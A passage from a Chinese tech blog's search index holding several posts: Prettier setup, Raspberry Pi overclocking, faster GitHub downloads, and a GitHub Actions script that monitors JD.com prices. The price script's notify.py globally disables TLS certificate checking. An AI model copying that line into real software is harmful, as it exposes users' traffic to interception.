title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th 